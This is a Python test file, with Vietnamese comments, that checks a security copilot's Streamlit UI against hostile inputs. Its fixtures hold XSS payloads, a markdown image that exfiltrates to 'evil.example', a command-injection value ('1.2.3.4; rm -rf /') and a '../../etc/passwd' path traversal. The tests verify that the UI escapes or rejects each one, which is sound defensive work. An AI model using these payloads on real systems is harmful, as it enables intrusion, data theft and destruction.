"""Chạy thử giao diện bằng Streamlit GIẢ (tests/fake_streamlit.py): bắt lỗi Python, kiểm tra luồng và quy tắc escape.
Không thay thế `streamlit run app.py` thật (xem checklist trong tài liệu bàn giao)."""
import json
import os
import re
import runpy
import sys
import tempfile
import unittest

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, ROOT)
sys.path.insert(0, os.path.join(ROOT, "tests"))
import fake_streamlit as F  # noqa: E402

F.install()
_TMP = tempfile.TemporaryDirectory()
os.environ["SOC_COPILOT_DB"] = os.path.join(_TMP.name, "ui.db")
from soc_copilot import storage  # noqa: E402
from ui import backend, tabs  # noqa: E402

XSS = "<img src=x onerror=alert(1)>"
ALERT = {"rule": {"id": "31105", "level": 6, "description": "XSS <script>alert(1)</script>", "groups": ["web"]},
         "agent": {"name": "<b>x</b>"},
         "data": {"srcip": "203.0.113.7", "url": XSS, "srcuser": "<b>x</b>"},
         "full_log": "GET /?q=<script>alert(1)</script> ```` [x](http://e.com) $$"}
HOSTILE = {"ok": True, "attack_type": "<script>alert(1)</script> **bold**", "summary": XSS + "\n# h",
           "severity": "<b>High</b>", "rule_severity": "Medium", "recommended_action": "BLOCK_IP",
           "action_target_ip": "203.0.113.7", "sop_id": XSS, "sop_distance": 0.3, "guard_notes": [XSS],
           "report_md": "![x](http://evil.example/?d=SECRET)\n[a](http://evil.example)",
           "timings": {"t_total": 1.5}, "meta": {"model": XSS}}
MD_FAMILY = ("markdown", "caption", "error", "warning", "info", "success", "subheader", "title", "header", "write")
ALLOWED_UNSAFE = re.compile(r'<style>.*?</style>|<span class="badge [a-z-]+">[^<>]*</span>', re.S)


def run():
    F.new_run()
    runpy.run_path(os.path.join(ROOT, "app.py"), run_name="__main__")
    F.end_run()


def calls(name):
    return [(a, k) for n, a, k in F.CALLS if n == name]


def bodies(include_unsafe=True):
    return [a[0] for n, a, k in F.CALLS if n in MD_FAMILY and a and isinstance(a[0], str)
            and (include_unsafe or not k.get("unsafe_allow_html"))]


class UiSmokeTest(unittest.TestCase):
    def setUp(self):
        F.reset()
        storage.delete_all()
        backend.analyze = lambda alert, model, mode, thr: dict(HOSTILE)

    def analyze(self, alert=ALERT):
        F.STATE["alert_text"] = json.dumps(alert)
        run()
        F.click("btn_analyze")
        run()
        return storage.list_analyses()[0]["id"]

    def test_first_render_and_mock_banner(self):
        run()
        self.assertTrue(any("MÔ PHỎNG" in b for b in bodies()))

    def test_invalid_inputs(self):
        F.STATE["alert_text"] = '{"a":'
        run()
        self.assertTrue(any("dòng 1" in b for b in bodies()))
        self.assertTrue([k for a, k in calls("button") if k["key"] == "btn_analyze"][0]["disabled"])
        F.STATE["alert_text"] = '{"a":1}'
        run()
        self.assertTrue(any("rule.id" in b for b in bodies()))

    def test_result_persists_and_is_saved(self):
        rid = self.analyze()
        self.assertEqual(storage.get_analysis(rid)["status"], "new")
        run()  # rerun không bấm gì: kết quả vẫn phải hiển thị (lỗi cũ: biến mất khi đổi widget)
        self.assertTrue(any(b.startswith("### ") for b in bodies()))

    def test_status_buttons_and_block_proposal(self):
        rid = self.analyze()
        F.click(f"cur_ok_{rid}"); run()
        self.assertEqual(storage.get_analysis(rid)["status"], "confirmed")
        okbtn = [k for a, k in calls("button") if k["key"] == f"cur_ok_{rid}"][0]
        self.assertTrue(okbtn["disabled"])
        F.click(f"cur_done_{rid}"); run()
        self.assertEqual(storage.get_analysis(rid)["status"], "resolved")
        F.click(f"cur_blk_{rid}"); run()
        self.assertTrue(any("iptables -I INPUT -s 203.0.113.7 -j DROP" in a[0] for a, k in calls("code")))

    def test_block_disabled_for_invalid_ip(self):
        bad = dict(HOSTILE, action_target_ip="1.2.3.4; rm -rf /")
        backend.analyze = lambda *a: dict(bad)
        rid = self.analyze()
        blk = [k for a, k in calls("button") if k["key"] == f"cur_blk_{rid}"][0]
        self.assertTrue(blk["disabled"])

    def test_no_dynamic_data_in_unsafe_html_or_markdown(self):
        rid = self.analyze()
        F.click(f"cur_blk_{rid}"); run()
        for a, k in calls("markdown"):
            if k.get("unsafe_allow_html"):
                rest = ALLOWED_UNSAFE.sub("", a[0])
                self.assertNotIn("<", rest, a[0]); self.assertNotIn("onerror", a[0])
        for b in bodies(include_unsafe=False):
            self.assertIsNone(re.search(r"(?<!\\)<", b.replace("`ollama pull <tên mô hình>`", "")), b)
            self.assertNotIn("![", b); self.assertNotIn("](http", b)
        raw = [a[0] for a, k in calls("code")]     # bằng chứng được hiển thị nguyên văn, dạng văn bản thuần
        self.assertTrue(any(XSS in r for r in raw))

    def test_history_tab_export_and_delete(self):
        rid = self.analyze()
        run()
        rows = [a[0] for a, k in calls("dataframe") if a and a[0] and "ID" in a[0][0]]
        self.assertTrue(rows and rows[0][0]["ID"] == rid)
        csvs = [a[1] for a, k in calls("download_button") if k.get("key") == "hist_csv"]
        self.assertTrue(csvs and csvs[0].startswith("id,ts,rule_id"))
        F.STATE["hist_del_ok"] = True
        run()
        F.click("hist_del_one"); run()
        self.assertEqual(storage.count_analyses(), 0)
        self.assertFalse(F.STATE["hist_del_ok"])

    def test_upload_multi_alert_and_sample_pick(self):
        class Up:
            def getvalue(self):
                return ('{"rule":{"id":"5710","level":5}}\n{"rule":{"id":"31103","level":7}}\n'
                        '{"rule":{"id":"550","level":7}}').encode()
        run()
        F.STATE["upload"] = Up(); F.click("upload"); run()
        self.assertEqual(len(F.STATE["loaded"]), 3)
        self.assertIn("5710", F.STATE["alert_text"])
        d = tempfile.mkdtemp(); tabs.SAMPLES_DIR = __import__("pathlib").Path(d)
        open(os.path.join(d, "m1.json"), "w").write('{"rule":{"id":"5760","level":5}}')
        run()
        F.STATE["sample_pick"] = "m1.json"; F.click("sample_pick"); run()
        self.assertIn("5760", F.STATE["alert_text"])
        F.STATE["sample_pick"] = "../../etc/passwd"; F.click("sample_pick")
        self.assertIn("5760", F.STATE["alert_text"])          # không đọc được file ngoài thư mục mẫu
        self.assertEqual(F.STATE["_flash"][0], "error")


if __name__ == "__main__":
    unittest.main()
